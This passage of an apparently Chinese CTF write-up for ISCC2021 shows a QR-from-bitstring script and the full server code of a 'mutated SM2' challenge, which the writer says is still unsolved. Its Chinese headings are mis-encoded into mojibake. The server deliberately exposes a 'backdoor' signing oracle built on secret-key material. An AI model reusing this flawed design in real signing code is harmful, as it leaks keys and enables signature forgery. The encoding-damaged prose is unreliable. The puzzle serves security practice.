class="hljs-string">&quot;1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel([x,y],(<span class="hljs-number">841</span>,<span class="hljs-number">841</span>,<span class="hljs-number">841</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ‰«ç å¾—åˆ°flag</p><h3 id="å˜å¼‚çš„SM2"><a href="#å˜å¼‚çš„SM2" class="headerlink" title="å˜å¼‚çš„SM2"></a>å˜å¼‚çš„SM2</h3><p>é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#server.py</span><br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> func, sm2<br><span class="hljs-comment"># from flag import FLAG</span><br>FLAG=<span class="hljs-string">&quot;&#123;testFlag&#125;&quot;</span><br><br>sm2p256v1_ecc_table = &#123;<br>    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> +<br>         <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,<br>&#125;<br>n = <span class="hljs-string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span><br>G = <span class="hljs-string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span> \<br>    <span class="hljs-string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign</span>(<span class="hljs-params">tsm2</span>):</span><br>    data = func.random_hex(<span class="hljs-built_in">len</span>(n)) <br>    k1_str = func.random_hex(<span class="hljs-built_in">len</span>(n))<br>    print(tsm2.send_p1(data, k1_str))<br>    backdoor = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;backdoor:&#x27;</span>).strip()<br>    result = tsm2.output_p1(k1_str, backdoor)<br>    print(result)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">tsm2</span>):</span><br>    message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;msg:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    sign = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;sign:&#x27;</span>).strip().encode().strip(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    check = tsm2.verify(sign, message)<br>    <span class="hljs-keyword">if</span> check <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> message == <span class="hljs-string">b&#x27;Hello, Welcome to ISCC2021!&#x27;</span>:<br>        print(FLAG)<br>    <span class="hljs-keyword">else</span>:<br>        print(check)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TSM2</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, sk</span>):</span><br>        ecc_table = sm2p256v1_ecc_table<br>        self.ecc_table = ecc_table<br>        self.n = <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-number">16</span>)<br>        self.para_len = <span class="hljs-built_in">len</span>(ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>])<br>        self.ecc_a3 = (<span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;a&#x27;</span>], base=<span class="hljs-number">16</span>) + <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>        self.sk = <span class="hljs-built_in">int</span>(sk, <span class="hljs-number">16</span>)<br>        self.pk = self._kg(self.sk, ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        <br>        self.sks = <span class="hljs-built_in">int</span>(func.random_hex(self.para_len), <span class="hljs-number">16</span>)<br>        self.pks = <span class="hljs-built_in">pow</span>((self.sk + <span class="hljs-number">1</span>) * self.sks, self.n - <span class="hljs-number">2</span>, self.n) % self.n<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_p1</span>(<span class="hljs-params">self, data, k1_str</span>):</span><br>        e = <span class="hljs-built_in">int</span>(data, <span class="hljs-number">16</span>)<br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        k1 = k1 % self.n<br>        R1 = self._kg(k1, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>]) <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%0128s&#x27;</span> % (e, R1) <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">output_p1</span>(<span class="hljs-params">self, k1_str, r_s2_s3</span>):</span><br>        r = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s2 = <span class="hljs-built_in">int</span>(r_s2_s3[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        s3 = <span class="hljs-built_in">int</span>(r_s2_s3[<span class="hljs-number">2</span> * self.para_len:], <span class="hljs-number">16</span>)<br><br>        k1 = <span class="hljs-built_in">int</span>(k1_str, <span class="hljs-number">16</span>)<br>        d1 = self.sks<br>        s = (d1 * k1 * s2 + d1 * s3 - r) % self.n <br>        <span class="hljs-keyword">if</span> s == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> s == (self.n - r):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%064x%064x&#x27;</span> % (r, s)  <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">self, Sign, data</span>):</span><br>        r = <span class="hljs-built_in">int</span>(Sign[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        s = <span class="hljs-built_in">int</span>(Sign[self.para_len:<span class="hljs-number">2</span> * self.para_len], <span class="hljs-number">16</span>)<br>        e = <span class="hljs-built_in">int</span>(data.<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br>        t = (r + s) % self.n<br>        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>        P1 = self._kg(s, self.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>])<br>        P2 = self._kg(t, self.pk)<br><br>        <span class="hljs-keyword">if</span> P1 == P2:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._double_point(P1)<br>        <span class="hljs-keyword">else</span>:<br>            P1 = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-number">1</span>)<br>            P1 = self._add_point(P1, P2)<br>            P1 = self._convert_jacb_to_nor(P1)<br><br>        x = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> r == ((e + x) % self.n)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_kg</span>(<span class="hljs-params">self, k, Point</span>):</span> <br>        <span class="hljs-keyword">if</span> (k % self.n) == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span><br>        Point = <span class="hljs-string">&#x27;%s%s&#x27;</span> % (Point, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        mask_str = <span class="hljs-string">&#x27;8&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len - <span class="hljs-number">1</span>):<br>            mask_str += <span class="hljs-string">&#x27;0&#x27;</span><br>        mask = <span class="hljs-built_in">int</span>(mask_str, <span class="hljs-number">16</span>)<br>        Temp = Point<br>        flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.para_len * <span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">if</span> flag:<br>                Temp = self._double_point(Temp)<br>            <span class="hljs-keyword">if</span> (k &amp; mask) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> flag:<br>                    Temp = self._add_point(Temp, Point)<br>                <span class="hljs-keyword">else</span>:<br>                    flag = <span class="hljs-literal">True</span><br>                    Temp = Point<br>            k = k &lt;&lt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> self._convert_jacb_to_nor(Temp)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_double_point</span>(<span class="hljs-params">self, Point</span>):</span> <br>        l = <span class="hljs-built_in">len</span>(Point)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        <span class="hljs-keyword">if</span> l &lt; self.para_len * <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            x1 = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y1 = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l == len_2:<br>                z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                z1 = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br><br>            T6 = (z1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y1 * y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (x1 - T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (y1 * z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * <span class="hljs-number">8</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (x1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * <span class="hljs-number">3</span>) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (T6 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T6 = (self.ecc_a3 * T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 + T6) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            z3 = (T3 + T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            x3 = (T3 - T5) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            <span class="hljs-keyword">if</span> (T5 % <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>:<br>                T4 = (T5 + ((T5 + <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)) &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">else</span>:<br>                T4 = (T5 + (T5 &gt;&gt; <span class="hljs-number">1</span>) - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            T1 = (T1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (x3, y3, z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_add_point</span>(<span class="hljs-params">self, P1, P2</span>):</span> <br>        <span class="hljs-keyword">if</span> P1 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P2, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        <span class="hljs-keyword">if</span> P2 == <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">128</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;%s%s&#x27;</span> % (P1, <span class="hljs-string">&#x27;1&#x27;</span>)<br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        l1 = <span class="hljs-built_in">len</span>(P1)<br>        l2 = <span class="hljs-built_in">len</span>(P2)<br>        <span class="hljs-keyword">if</span> (l1 &lt; len_2) <span class="hljs-keyword">or</span> (l2 &lt; len_2):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">else</span>:<br>            X1 = <span class="hljs-built_in">int</span>(P1[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            Y1 = <span class="hljs-built_in">int</span>(P1[self.para_len:len_2], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">if</span> l1 == len_2:<br>                Z1 = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                Z1 = <span class="hljs-built_in">int</span>(P1[len_2:], <span class="hljs-number">16</span>)<br>            x2 = <span class="hljs-built_in">int</span>(P2[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>            y2 = <span class="hljs-built_in">int</span>(P2[self.para_len:len_2], <span class="hljs-number">16</span>)<br><br>            T1 = (Z1 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (y2 * Z1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (x2 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T3 - X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 + X1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (T2 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 - Y1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Z3 = (Z1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (T2 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T3 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (X1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            X3 = (T5 - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (Y1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T4 - X3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (X3, Y3, Z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_convert_jacb_to_nor</span>(<span class="hljs-params">self, Point</span>):</span> <br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        x = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        y = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>        z = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br>        z_inv = <span class="hljs-built_in">pow</span>(z, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>) - <span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>))<br>        z_invSquar = (z_inv * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_invQube = (z_invSquar * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        x_new = (x * z_invSquar) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        y_new = (y * z_invQube) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_new = (z * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> z_new == <span class="hljs-number">1</span>:<br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">2</span><br>            <span class="hljs-keyword">return</span> form % (x_new, y_new)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sk = func.random_hex(<span class="hljs-built_in">len</span>(sm2p256v1_ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>]))<br>    tsm2 = TSM2(sk)<br>    print(<span class="hljs-string">&#x27;pk:%s&#x27;</span>   %tsm2.pk)<br>    print(<span class="hljs-string">&#x27;pks:%064x&#x27;</span>%tsm2.pks)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        op = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;op: &#x27;</span>).strip()<br>        <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;sign&#x27;</span>:<br>            sign(tsm2)<br>        <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;verify&#x27;</span>:<br>            verify(tsm2)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;&quot;&quot;sign: sign message</span><br><span class="hljs-string">verify: verify message&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>æš‚æ—¶æ²¡åšå‡ºæ¥</p><h3 id="æ··ä¹±çš„éŸ³é¢‘"><a href="#æ··ä¹±çš„éŸ³é¢‘" class="headerlink" 